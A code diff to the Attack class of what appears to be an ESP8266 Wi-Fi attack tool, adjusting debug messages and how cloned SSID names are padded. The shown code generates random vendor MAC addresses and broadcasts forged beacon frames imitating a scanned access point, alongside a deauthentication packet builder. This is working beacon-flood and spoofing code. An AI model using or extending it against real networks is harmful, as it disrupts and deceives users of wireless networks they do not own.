@@ -6,7 +6,7 @@ Attack::Attack(){
 }
 
 void Attack::generate(){
-  if(debug) Serial.print("generating Macs");
+  if(debug) Serial.print("generating Macs...");
   
   Mac _randomBeaconMac;
   uint8_t _randomMacBuffer[6];
@@ -16,7 +16,7 @@ void Attack::generate(){
     getRandomVendorMac(_randomMacBuffer);
     for(int i=0;i<6;i++) _randomBeaconMac.setAt(_randomMacBuffer[i],i);
   }while(beaconAdrs.add(_randomBeaconMac) >= 0);
-  if(debug) Serial.println(" done");
+  if(debug) Serial.println("done");
 }
 
 void Attack::buildDeauth(Mac _ap, Mac _client, uint8_t type, uint8_t reason){
@@ -165,42 +165,26 @@ void Attack::run(){
         Mac _broadcast;
         _broadcast.set(0xFF,0xFF,0xFF,0xFF,0xFF,0xFF);
 
-        wifi_set_channel(_ch);
-
-        //int _selectedClients = 0;
+        //wifi_set_channel(_ch);
 
         for(int c=0;c<macListLen/apScan.selectedSum;c++){
           String _apName = _ssid;
               
-          if(c < _restSSIDLen) for(int d=0; d < _restSSIDLen-c; d++) _apName += " ";//e.g. "SAMPLEAP           "
+          if(c < _restSSIDLen) for(int d=0; d < _restSSIDLen-c; d++) _apName += " ";//e.g. "SAMPLEAP   "
           else if(c < _restSSIDLen*2){
             _apName = " "+_apName;
             for(int d=0;d<(_restSSIDLen-1)-c/2;d++) _apName += " ";//e.g. " SAMPLEAP   "
           }else if(c < _restSSIDLen*3){
-            _apName += ".";
+            _apName = "."+_apName;
             for(int d=0;d<(_restSSIDLen-1)-c/3;d++) _apName += " ";//e.g. ".SAMPLEAP   "
           } else{
-            for(int d=0; d < _restSSIDLen-1; d++) _apName += " ";
+            for(int d=0; d < _restSSIDLen-2; d++) _apName += " ";
             _apName += (String)c;//e.g. "SAMPLEAP        78"
           }
 
-          //build a broadcast packet for this AP & SSID
           buildBeacon(beaconAdrs._get(c),_broadcast,_apName,_ch,apScan.getAPEncryption(a) != "none");
 
-          /*
-          for(int b=0;b<clientScan.results;b++){
-            if(clientScan.getClientSelected(b)){
-              _selectedClients++;
-
-              //change packet to adress only the selected client
-              for(int i=0;i<6;i++) packet[4+i] = clientScan.getClientMac(b)._get(i);
-              
-              if(send()) packetsCounter[1]++;
-            }
-          }*/
-
-          //if no clients are selected send the broadcast packet
-          /*if(_selectedClients == 0)*/ if(send()) packetsCounter[1]++;
+          if(send()) packetsCounter[1]++;
         }
         
       }
